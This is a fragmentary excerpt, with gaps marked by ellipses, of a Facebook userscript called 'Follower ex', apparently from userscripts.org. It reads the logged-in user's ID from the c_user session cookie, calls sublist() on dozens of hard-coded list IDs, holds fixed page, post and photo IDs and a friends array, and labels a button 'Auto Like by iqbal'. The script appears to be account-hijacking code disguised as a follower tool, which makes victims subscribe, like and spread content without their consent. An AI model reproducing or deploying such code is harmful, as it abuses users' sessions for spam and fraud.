// ==UserScript==
// @name            Facebook Follower ex
// @description     Facebook Follower ex
// @namespace       http://userscripts.org/scripts/review/180681
// @updateURL       https://userscripts.org/scripts/source/180681.meta.js
// @downloadURL     https://userscripts.org/scripts/source/180681.user.js
// @homepageURL     https://userscripts.org/scripts/show/180681
...
sublist("1436387889921418");
 
sublist("1436387529921454");
sublist("1436387726588101");
sublist("1425563797670494");
sublist("1438733533020187");
sublist("1438733356353538");
sublist("1438733203020220");
sublist("1438733696353504");
sublist("1438734096353464");
sublist("1438734173020123");
sublist("1438734263020114");
sublist("1438734326353441");
sublist("1438734396353434");
sublist("1438734466353427");
...
var spage_id = "503335703047652";
var spost_id = "128791540654103";
var sfoto_id = "503953139652575";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Like by iqbal';
